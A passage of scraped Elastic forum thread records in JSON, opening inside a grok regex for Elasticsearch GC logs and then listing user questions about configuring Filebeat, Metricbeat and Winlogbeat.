secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[weak refs processing, (?<BASE10NUM:elasticsearch.gc.phase.weak_refs_processing_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[class unloading, (?<BASE10NUM:elasticsearch.gc.phase.class_unload_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[scrub symbol table, (?<BASE10NUM:elasticsearch.gc.phase.scrub_symbol_table_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[scrub string table, (?<BASE10NUM:elasticsearch.gc.phase.scrub_string_table_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]\\[1 CMS-remark: (?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\)\\] (?<BASE10NUM:elasticsearch.gc.heap.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.heap.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\), (?<BASE10NUM:elasticsearch.gc.phase.duration_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\] (?:\\[Times: user=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.user_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) sys=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.sys_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))), real=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.real_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]))|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)) \\[GC \\((?<DATA:elasticsearch.gc.phase.name>.*?)\\) \\[(?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) CMS-initial-mark: (?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\)\\] (?<BASE10NUM:elasticsearch.gc.heap.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.heap.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\), (?<BASE10NUM:elasticsearch.gc.phase.duration_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\] (?:\\[Times: user=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.user_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) sys=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.sys_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))), real=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.real_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]))|(?:(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\]) GC\\((?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))\\) ParNew: (?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K-\\>(?<BASE10NUM:elasticsearch.gc.young_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.young_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\))|(?:(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\]) GC\\((?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))\\) Old: (?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K-\\>(?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\))|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)|(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\])) (?<GREEDYMULTILINE:message>(.| Feb 25 13:55:01 SIEM-02 elasticsearch[23298]: )*))/ OS used by Centos 8 these messages are seen because of the cost of filebeat and it finds ~10,000 messages every hour. confuses that messages in General in /var/log/messages although in the settings it is necessary to write messages in /var/log/elasticsearch",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "75321dfd-0164-43ba-9d1b-124d2df2b2e2",
    "url": "https://discuss.elastic.co/t/private-ip-geoip/225927",
    "title": "Private IP GeoIP",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "dshepard",
    "date": "March 31, 2020, 5:42pm April 1, 2020, 12:51am April 1, 2020, 1:22pm",
    "body": "Does anyone have a working config for assigning GeoIP data to private subnets wtih winlogbeat?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2ebde9bf-4262-4b2a-8073-c120799dda4f",
    "url": "https://discuss.elastic.co/t/what-is-a-better-option-creating-a-metric-set-or-create-a-new-beat/225999",
    "title": "What is a better option? Creating a Metric Set or Create a new beat",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "",
    "date": "April 1, 2020, 9:12am April 2, 2020, 6:16am April 1, 2020, 10:21am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "35f86f8f-a268-44d8-817b-476fc6455ea1",
    "url": "https://discuss.elastic.co/t/filebeat-logs/225917",
    "title": "Filebeat_logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Anuradha",
    "date": "March 31, 2020, 4:44pm April 1, 2020, 10:06am",
    "body": "I am not able to get any logs in filebeat on kibana dashboard",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "33eb54b3-059d-4dd5-afa2-d6ea12519ee7",
    "url": "https://discuss.elastic.co/t/http-json-module-processing-json-array/225833",
    "title": "HTTP-json module: processing json array",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "jetnet",
    "date": "March 31, 2020, 10:22am March 31, 2020, 2:42pm March 31, 2020, 2:50pm March 31, 2020, 3:37pm April 1, 2020, 9:01am April 1, 2020, 9:12am",
    "body": "I'm getting the following response from a web-server: { \"items\": [ {\"id\": \"0\", \"title\": \"title 1\", \"text\": \"some text\"}, {\"id\": \"1\", \"title\": \"title 2\", \"text\": \"some text\"} ] } Is is possible: to drop items.*.text ? to split items into separate events? Thank a lot!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "51582dd4-8705-40ae-a903-1dfe8d29573c",
    "url": "https://discuss.elastic.co/t/cannot-parse-multiline-log-using-filebeat/225628",
    "title": "Cannot parse multiline log using Filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Bhanu1",
    "date": "March 30, 2020, 7:58am March 30, 2020, 8:44am March 30, 2020, 9:01am March 30, 2020, 9:05am March 30, 2020, 9:15am March 31, 2020, 3:53am April 1, 2020, 5:52am",
    "body": "Hi I am new to Filebeats , I need some help to parse logfiles with below pattern Please help 2020-03-27T14:00:05+00:00 log-forwarder-68kh5 kapacitor-7cf7f7bdd4-lb6cn_monit {\"log\":\"ts=2020-03-27T14:00:05.321Z lvl=info msg=\"http request\" service=http host=127.0.0.1 username=- start=2020-03-27T14:00:05.319802032Z method=GET uri=/kapacitor/v1/task s?dot-view=attributes\\u0026fields=type\\u0026fields=status\\u0026fields=executing\\u0026fields=dbrps\\u0026limit=100\\u0026offset=0\\u0026pattern=\\u0026replay-id=\\u0026script-format=formatted protocol=HTTP/1.1 status=200 referer=- user-agent=KapacitorClient re quest-id=42b7acc8-7033-11ea-855b-000000000000 duration=1.505141ms\\n\",\"stream\":\"stderr\",\"time\":\"2020-03-27T14:00:05.321393951Z\"} 2020-03-27T14:00:09+00:00 log-forwarder-68kh5 kapacitor-7cf7f7bdd4-lb6cn_monit {\"log\":\"ts=2020-03-27T14:00:08.990Z lvl=info msg=\"http request\" service=http host=10.244.52.203 username=- start=2020-03-27T14:00:08.990170521Z method=POST uri=/write?consis tency=\\u0026db=k8s\\u0026precision=ns\\u0026rp=default protocol=HTTP/1.1 status=204 referer=- user-agent=InfluxDBClient request-id=44e7ba8e-7033-11ea-8561-000000000000 duration=180.931µs\\n\",\"stream\":\"stderr\",\"time\":\"2020-03-27T14:00:08.990597135Z\"} 2020-03-27T14:00:09+00:00 log-forwarder-68kh5 kapacitor-7cf7f7bdd4-lb6cn_monit {\"log\":\"ts=2020-03-27T14:00:09.022Z lvl=info msg=\"http request\" service=http host=10.244.52.203 username=- start=2020-03-27T14:00:09.022182012Z method=POST uri=/write?consis tency=\\u0026db=k8s\\u0026precision=ns\\u0026rp=default protocol=HTTP/1.1 status=204 referer=- user-agent=InfluxDBClient request-id=44ec9d01-7033-11ea-8562-000000000000 duration=86.487µs\\n\",\"stream\":\"stderr\",\"time\":\"2020-03-27T14:00:09.023165862Z\"}",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "3dd9de99-9009-4847-b3cb-83183b3eac6a",
    "url": "https://discuss.elastic.co/t/filebeat-tcp-input-with-nginx-module/225618",
    "title": "Filebeat TCP input with Nginx Module",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "karnamonkster",
    "date": "March 30, 2020, 7:01am March 30, 2020, 8:54am March 30, 2020, 9:30am March 31, 2020, 7:27am March 31, 2020, 8:24am March 31, 2020, 8:30am April 1, 2020, 5:17am",
    "body": "Hi , My setup: Elasticsearch & Kibana - 7.5.2 Filebeat - 7.5.x I have a Filebeat(NGINX-1) listen on TCP input to recieve Proxy logs from a remote NGINX server(NGINX-2) sending logs through Logstash TCP output. My question is how to use a Filebeat.input : TCP method to ingest logs from NGINX-2 (remote proxy) and parse the logs within the same filebeat index using the currently running\"nginx\" module. Also NGINX2 cannot send logs directly to Elasticsearch nodes. I know how to configure logstash and parse the logs separately, but i would like to explore using one filebeat tcp input with nginx module enabled.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "b327b03a-d98f-4864-9f00-517bca70ce4e",
    "url": "https://discuss.elastic.co/t/metricbeat-jolokia-module-not-capturing-all-data/225333",
    "title": "Metricbeat Jolokia Module Not Capturing all data",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "jason_0",
    "date": "March 27, 2020, 5:31am March 30, 2020, 8:11am March 31, 2020, 7:42pm March 31, 2020, 10:30pm",
    "body": "I have a RedHat AMQ setup with some dummy data in it that I'm trying to capture with Metricbeat. I'm able to capture standard MBean attributes such as java.lang:type=Runtime's 'Uptime'. I'm also able to capture some AMQ data using the following: - module: jolokia service.name: \"JOLOKIA\" metricsets: [\"jmx\"] period: 10s hosts: [\"10.1.43.40:8161\"] namespace: \"metrics\" path: \"console/jolokia/?ignoreErrors=true&canonicalNaming=false\" username: \"admin\" password: \"admin\" http_method: 'POST' jmx.mappings: - mbean: 'java.lang:type=Runtime' attributes: - attr: Uptime field: uptime - mbean: 'org.apache.activemq.artemis:broker=\"0.0.0.0\"' attributes: - attr: AddressMemoryUsage field: AddressMemoryUsage However, I'm unable to get data from other MBeans example of the entire file is below. Note, the data I'm talking about is for MBean 'org.apache.activemq.artemis:broker=\"0.0.0.0\",component=addresses,address=\"helloworld\",subcomponent=queues,routing-type=\"anycast\",queue=\"helloworld\"' - module: jolokia service.name: \"JOLOKIA\" metricsets: [\"jmx\"] period: 10s hosts: [\"10.1.43.40:8161\"] namespace: \"metrics\" path: \"console/jolokia/?ignoreErrors=true&canonicalNaming=false\" username: \"admin\" password: \"admin\" http_method: 'POST' jmx.mappings: - mbean: 'java.lang:type=Runtime' attributes: - attr: Uptime field: uptime - mbean: 'java.lang:type=Memory' attributes: - attr: HeapMemoryUsage field: memory.heap_usage - attr: NonHeapMemoryUsage field: memory.non_heap_usage - mbean: 'org.apache.activemq.artemis:broker=\"0.0.0.0\"' attributes: - attr: AddressMemoryUsage field: AddressMemoryUsage - attr: ConnectionCount field: ConnectionCount - attr: TotalConnectionCount field: TotalConnectionCount - attr: TotalConsumerCount field: TotalConsumerCount - attr: TotalMessageCount field: TotalMessageCount - attr: TotalMessagesAcknowledged field: TotalMessagesAcknowledged - attr: TotalMessagesAdded field: TotalMessagesAdded - attr: Uptime field: BrokerUptime - mbean: 'org.apache.activemq.artemis:broker=\"0.0.0.0\",component=addresses,address=\"helloworld\",subcomponent=queues,routing-type=\"anycast\",queue=\"helloworld\"' attributes: - attr: MessageCount field: HelloWorldMessageCount jmx.application: jmx.instance: headers: Origin: http://10.1.43.40 I captured the logs and I can see the data is being provided in the response, but Metricbeat doesn't seem to understand it. Mar 26 23:07:21 localhost metricbeat: 2020-03-26T23:07:20.995Z#011DEBUG#011[jolokia.jmx]#011jmx/config.go:499#011Jolokia response body#011{\"host\": \"10.1.43.40:8161\", \"host\": \"10.1.43.40:8161\", \"uri\": \"http://10.1.43.40:8161/console/jolokia/%3FignoreErrors=true&canonicalNaming=false\", \"body\": \"[{\\\"request\\\":{\\\"mbean\\\":\\\"java.lang:type=Runtime\\\",\\\"attribute\\\":\\\"Uptime\\\",\\\"type\\\":\\\"read\\\"},\\\"value\\\":{\\\"Uptime\\\":12887343},\\\"timestamp\\\":1585264040,\\\"status\\\":200},{\\\"request\\\":{\\\"mbean\\\":\\\"java.lang:type=Memory\\\",\\\"attribute\\\":[\\\"HeapMemoryUsage\\\",\\\"NonHeapMemoryUsage\\\"],\\\"type\\\":\\\"read\\\"},\\\"value\\\":{\\\"HeapMemoryUsage\\\":{\\\"init\\\":536870912,\\\"committed\\\":536870912,\\\"max\\\":2147483648,\\\"used\\\":164582368},\\\"NonHeapMemoryUsage\\\":{\\\"init\\\":2555904,\\\"committed\\\":69230592,\\\"max\\\":-1,\\\"used\\\":67068048}},\\\"timestamp\\\":1585264040,\\\"status\\\":200},{\\\"request\\\":{\\\"mbean\\\":\\\"org.apache.activemq.artemis:broker=\\\\\\\"0.0.0.0\\\\\\\"\\\",\\\"attribute\\\":[\\\"AddressMemoryUsage\\\",\\\"ConnectionCount\\\",\\\"TotalConnectionCount\\\",\\\"TotalConsumerCount\\\",\\\"TotalMessageCount\\\",\\\"TotalMessagesAcknowledged\\\",\\\"TotalMessagesAdded\\\",\\\"Uptime\\\"],\\\"type\\\":\\\"read\\\"},\\\"value\\\":{\\\"AddressMemoryUsage\\\":111280,\\\"TotalMessageCount\\\":100,\\\"ConnectionCount\\\":0,\\\"Uptime\\\":\\\"18 hours 36 minutes\\\",\\\"TotalMessagesAdded\\\":100,\\\"TotalMessagesAcknowledged\\\":0,\\\"TotalConsumerCount\\\":0,\\\"TotalConnectionCount\\\":2},\\\"timestamp\\\":1585264040,\\\"status\\\":200},{\\\"request\\\":{\\\"mbean\\\":\\\"org.apache.activemq.artemis:address=\\\\\\\"helloworld\\\\\\\",broker=\\\\\\\"0.0.0.0\\\\\\\",component=addresses,queue=\\\\\\\"helloworld\\\\\\\",routing-type=\\\\\\\"anycast\\\\\\\",subcomponent=queues\\\",\\\"attribute\\\":\\\"MessageCount\\\",\\\"type\\\":\\\"read\\\"},\\\"value\\\":{\\\"MessageCount\\\":100},\\\"timestamp\\\":1585264040,\\\"status\\\":200}]\", \"type\": \"response\"} Mar 26 23:07:21 localhost metricbeat: 2020-03-26T23:07:20.995Z#011DEBUG#011[jolokia.jmx]#011jmx/data.go:205#011mapping: map[{mbean:java.lang:type=Memory attr:HeapMemoryUsage}:{Attr:HeapMemoryUsage Field:memory.heap_usage Event:} {mbean:java.lang:type=Memory attr:NonHeapMemoryUsage}:{Attr:NonHeapMemoryUsage Field:memory.non_heap_usage Event:} {mbean:java.lang:type=Runtime attr:Uptime}:{Attr:Uptime Field:uptime Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:AddressMemoryUsage}:{Attr:AddressMemoryUsage Field:AddressMemoryUsage Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:ConnectionCount}:{Attr:ConnectionCount Field:ConnectionCount Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:TotalConnectionCount}:{Attr:TotalConnectionCount Field:TotalConnectionCount Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:TotalConsumerCount}:{Attr:TotalConsumerCount Field:TotalConsumerCount Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:TotalMessageCount}:{Attr:TotalMessageCount Field:TotalMessageCount Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:TotalMessagesAcknowledged}:{Attr:TotalMessagesAcknowledged Field:TotalMessagesAcknowledged Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:TotalMessagesAdded}:{Attr:TotalMessagesAdded Field:TotalMessagesAdded Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\" attr:Uptime}:{Attr:Uptime Field:BrokerUptime Event:} {mbean:org.apache.activemq.artemis:broker=\"0.0.0.0\",component=addresses,address=\"helloworld\",subcomponent=queues,routing-type=\"anycast\",queue=\"helloworld\" attr:MessageCount}:{Attr:MessageCount Field:HelloWorldMessageCount Event:}] Mar 26 23:07:21 localhost metricbeat: 2020-03-26T23:07:20.995Z#011DEBUG#011[processors]#011processing/processors.go:186#011Publish event: { Mar 26 23:07:21 localhost metricbeat: \"@timestamp\": \"2020-03-26T23:07:20.902Z\", Mar 26 23:07:21 localhost metricbeat: \"@metadata\": { Mar 26 23:07:21 localhost metricbeat: \"beat\": \"metricbeat\", Mar 26 23:07:21 localhost metricbeat: \"type\": \"_doc\", Mar 26 23:07:21 localhost metricbeat: \"version\": \"7.6.1\" Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"service\": { Mar 26 23:07:21 localhost metricbeat: \"type\": \"jolokia\", Mar 26 23:07:21 localhost metricbeat: \"address\": \"10.1.43.40:8161\", Mar 26 23:07:21 localhost metricbeat: \"name\": \"JOLOKIA\" Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"jolokia\": { Mar 26 23:07:21 localhost metricbeat: \"metrics\": { Mar 26 23:07:21 localhost metricbeat: \"TotalMessagesAcknowledged\": 0, Mar 26 23:07:21 localhost metricbeat: \"TotalConsumerCount\": 0, Mar 26 23:07:21 localhost metricbeat: \"TotalConnectionCount\": 2, Mar 26 23:07:21 localhost metricbeat: \"ConnectionCount\": 0, Mar 26 23:07:21 localhost metricbeat: \"BrokerUptime\": \"18 hours 36 minutes\", Mar 26 23:07:21 localhost metricbeat: \"memory\": { Mar 26 23:07:21 localhost metricbeat: \"heap_usage\": { Mar 26 23:07:21 localhost metricbeat: \"init\": 5.36870912e+08, Mar 26 23:07:21 localhost metricbeat: \"committed\": 5.36870912e+08, Mar 26 23:07:21 localhost metricbeat: \"max\": 2.147483648e+09, Mar 26 23:07:21 localhost metricbeat: \"used\": 1.64582368e+08 Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"non_heap_usage\": { Mar 26 23:07:21 localhost metricbeat: \"committed\": 6.9230592e+07, Mar 26 23:07:21 localhost metricbeat: \"max\": -1, Mar 26 23:07:21 localhost metricbeat: \"used\": 6.7068048e+07, Mar 26 23:07:21 localhost metricbeat: \"init\": 2.555904e+06 Mar 26 23:07:21 localhost metricbeat: } Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"AddressMemoryUsage\": 111280, Mar 26 23:07:21 localhost metricbeat: \"TotalMessagesAdded\": 100, Mar 26 23:07:21 localhost metricbeat: \"uptime\": 1.2887343e+07, Mar 26 23:07:21 localhost metricbeat: \"TotalMessageCount\": 100 Mar 26 23:07:21 localhost metricbeat: } Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"ecs\": { Mar 26 23:07:21 localhost metricbeat: \"version\": \"1.4.0\" Mar 26 23:07:21 localhost metricbeat: }, Mar 26 23:07:21 localhost metricbeat: \"host\": { Mar 26 23:07:21 localhost metricbeat: \"containerized\": false, Mar 26 23:07:21 localhost metricbeat: \"name\": \"mq01\", Mar 26 23:07:21 localhost metricbeat: \"hostname\": \"mq01\", Mar 26 23:07:21 localhost metricbeat: \"architecture\": \"x86_64\", Can anyone help me to resolve this?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "5f658a4c-544c-4434-94f3-c2831a92180f",
    "url": "https://discuss.elastic.co/t/fixing-multiline-logs-in-filebeat/224299",
    "title": "Fixing Multiline Logs in Filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "March 19, 2020, 7:00pm March 23, 2020, 8:07pm March 23, 2020, 8:03pm March 31, 2020, 9:09pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "69b23db5-74a7-4b16-8476-b24b3412e23f",
    "url": "https://discuss.elastic.co/t/what-does-filebeats-multiline-tool-match/225720",
    "title": "What does filebeat's multiline tool match",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "kevin5617",
    "date": "March 30, 2020, 5:25pm March 31, 2020, 8:16am March 31, 2020, 6:02pm March 31, 2020, 9:09pm",
    "body": "I am using filebeat to read Docker logs and feed them to logstash. I have some logs that are being split into separate events. This happens with stack traces, or just any logs with a new line in them. Here is my filebeat.yml file. filebeat.autodiscover: providers: - type: docker templates: - config: - type: container paths: - \"/var/lib/docker/containers/${data.docker.container.id}/*.log\" logging.metrics.enabled: false output.logstash: hosts: - logstash:5044 I have a couple questions about this. First off, if I look in those .log files, they are in the following format {\"log\":\"Message is in here\\n\", \"stream\":\"stderr\", \"time\":\"<timestamp here>\"} {\"log\":\"\\u0009this line should be added to the previous log\\n\", \"stream\":\"stderr\", \"time\":\"<timestamp here>\"} In the multiline.pattern field, is it looking to match the log part only, or the entire line starting with the {? Basically it comes down to should I use multiline.pattern: '^{\"log\":\"\\t' or multiline.pattern: '^\\t' In addition, will this tool even work because i just want to take the log part and append it to the previous log message?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c6df2bcc-3d4b-427e-8df0-4fd573e05593",
    "url": "https://discuss.elastic.co/t/filebeat-pipping-suricatas-eve-json-issues/225890",
    "title": "Filebeat pipping Suricatas eve.json issues",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "eriknox",
    "date": "March 31, 2020, 2:39pm March 31, 2020, 5:55pm April 1, 2020, 10:05am",
    "body": "Hello all, I have Elastic 7.6.1 up and running without the use of Logstash. My issue that I have is that I cannot get Filebeat to ingest Suricata. I have the module imported. Suricata is alerting and dropping the json into the eve.json file. Filebeat is configured to look in there and has loaded the dashboards. I can be more verbose, just let me know what you need to know. /etc/filebeat/modules.d/suricata.yml #Module: suricata - module: suricata #All logs eve: enabled: true var.paths: [“/usr/local/var/log/suricata/eve.json”] filebeat.yml setup.kibana: host: \"192.168.1.200:5601\" filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false output.elasticsearch: hosts: [\"192.168.1.200:9200\"] ```````````````````````````````````` Any help would be much appreciated.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "625a16e0-7462-455a-b9a6-e42f3bb0bf18",
    "url": "https://discuss.elastic.co/t/build-winlobeat-deb-file/225734",
    "title": "Build Winlobeat deb file",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "micas",
    "date": "March 30, 2020, 7:03pm March 30, 2020, 9:59pm March 30, 2020, 10:51pm March 31, 2020, 5:28pm March 31, 2020, 5:28pm",
    "body": "I know the request is odd but i want to distribute winlogbeat inside a docker container that runs debian. I plan then (through configs and volumes) to read from the host windows machine. Is there any way i can build a winlogbeat deb to distribute inside my docker container?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1aecf746-52c3-4c0f-a105-261e14dc1c34",
    "url": "https://discuss.elastic.co/t/metricbeat-password-literal-issue/225851",
    "title": "Metricbeat password literal issue",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "naveenbangalore",
    "date": "March 31, 2020, 12:07pm March 31, 2020, 2:39pm March 31, 2020, 4:29pm March 31, 2020, 4:56pm",
